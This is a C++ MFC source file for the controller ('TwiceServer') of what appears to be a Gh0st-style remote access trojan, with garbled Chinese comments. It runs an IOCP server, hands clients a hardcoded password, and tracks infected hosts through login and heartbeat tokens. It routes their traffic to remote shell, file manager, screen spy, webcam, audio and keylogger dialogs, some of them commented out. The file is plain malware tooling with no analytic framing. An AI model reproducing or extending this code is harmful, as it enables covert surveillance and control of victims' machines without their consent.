
// MainFrm.cpp : CMainFrame ���ʵ��
//

#include "stdafx.h"
#include "TwiceServer.h"

#include "MainFrm.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
CChildView* g_pConnectView = NULL; //��NotifyProc�г�ʼ��

CIOCPServer *m_iocpServer = NULL;
CString		m_PassWord = "password";
CMainFrame	*g_pFrame; // ��CMainFrame::CMainFrame()�г�ʼ��

// CMainFrame

IMPLEMENT_DYNAMIC(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	ON_WM_CREATE()
	ON_WM_SETFOCUS()
END_MESSAGE_MAP()

// CMainFrame ����/����

CMainFrame::CMainFrame()
{
	// TODO: �ڴ���ӳ�Ա��ʼ������
	g_pFrame = this;
}

CMainFrame::~CMainFrame()
{
}

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;

	// ����һ����ͼ��ռ�ÿ�ܵĹ�����
	if (!m_wndView.Create(NULL, NULL, AFX_WS_DEFAULT_VIEW,
		CRect(0, 0, 0, 0), this, AFX_IDW_PANE_FIRST, NULL))
	{
		TRACE0("δ�ܴ�����ͼ����\n");
		return -1;
	}
	return 0;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO: �ڴ˴�ͨ���޸�
	//  CREATESTRUCT cs ���޸Ĵ��������ʽ

	cs.dwExStyle &= ~WS_EX_CLIENTEDGE;
	cs.lpszClass = AfxRegisterWndClass(0);
	return TRUE;
}

// CMainFrame ���

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}
#endif //_DEBUG


// CMainFrame ��Ϣ�������

void CMainFrame::OnSetFocus(CWnd* /*pOldWnd*/)
{
	// ������ǰ�Ƶ���ͼ����
	m_wndView.SetFocus();
}

BOOL CMainFrame::OnCmdMsg(UINT nID, int nCode, void* pExtra, AFX_CMDHANDLERINFO* pHandlerInfo)
{
	// ����ͼ��һ�γ��Ը�����
	if (m_wndView.OnCmdMsg(nID, nCode, pExtra, pHandlerInfo))
		return TRUE;

	// ����ִ��Ĭ�ϴ���
	return CFrameWnd::OnCmdMsg(nID, nCode, pExtra, pHandlerInfo);
}


void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	try
	{
		CMainFrame* pFrame = (CMainFrame*) lpParam;
		CString str;
		// ��g_pConnectView ���г�ʼ��
		g_pConnectView = (CChildView *)((CTwiceServerApp *)AfxGetApp())->m_pConnectView;

		// g_pConnectView��û��������������ᷢ��
		if (((CTwiceServerApp *)AfxGetApp())->m_pConnectView == NULL)
			return;

		g_pConnectView->m_iocpServer = m_iocpServer;

		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);
			break;
		}
	}catch(...){}
}

void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
{
	CString		str;

	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;

	}
	m_iocpServer = new CIOCPServer;

	// ����IPCP������
	if ( !m_iocpServer->Initialize(NotifyProc, this, 10000, nPort))
	{
		AfxMessageBox("Iocp failed!");
	}


}

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// �������Ի���򿪣�������Ӧ�ĶԻ�����
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];

	// �������ڴ���
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
// 		case FILEMANAGER_DLG:
// 			((CFileManagerDlg *)dlg)->OnReceiveComplete();
// 			break;
// 		case SCREENSPY_DLG:
// 			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
// 			break;
// 		case WEBCAM_DLG:
// 			((CWebCamDlg *)dlg)->OnReceiveComplete();
// 			break;
// 		case AUDIO_DLG:
// 			((CAudioDlg *)dlg)->OnReceiveComplete();
// 			break;
// 		case KEYBOARD_DLG:
// 			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
// 			break;
// 		case SYSTEM_DLG:
// 			((CSystemDlg *)dlg)->OnReceiveComplete();
// 			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUTH: // Ҫ����֤
		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		break;
	case TOKEN_HEARTBEAT: // �ظ�������
		{
			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}

		break;
	case TOKEN_LOGIN: // ���߰�
		{
			if (m_iocpServer->m_nMaxConnections <= g_pConnectView->m_ListCtrl.GetItemCount())
			{
				closesocket(pContext->m_Socket);
			}
			else
			{
				pContext->m_bIsMainSocket = true;
				g_pConnectView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
			}
			// ����
			BYTE	bToken = COMMAND_ACTIVED;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}

		break;
	case TOKEN_DRIVE_LIST: // �������б�
		// ָ�ӵ���public������ģ̬�Ի����ʧȥ��Ӧ�� ��֪����ô����,̫��
		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
		// ָ�ӵ���public������ģ̬�Ի����ʧȥ��Ӧ�� ��֪����ô����
		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // ����ͷ
		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_AUDIO_START: // ����
		g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START:
		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST:
		g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START:
		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
		// ����ֹͣ��ǰ����
	default:
		closesocket(pContext->m_Socket);
		break;
	}	
}

// ��Ҫ��ʾ���ȵĴ���
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
	if (pContext == NULL)
		return;
	// �������Ի���򿪣�������Ӧ�ĶԻ�����
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];

	// �������ڴ���
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
// 		case SCREENSPY_DLG:
// 			((CScreenSpyDlg *)dlg)->OnReceive();
// 			break;
// 		case WEBCAM_DLG:
// 			((CWebCamDlg *)dlg)->OnReceive();
// 			break;
// 		case AUDIO_DLG:
// 			((CAudioDlg *)dlg)->OnReceive();
// 			break;
		default:
			break;
		}
		return;
	}
}
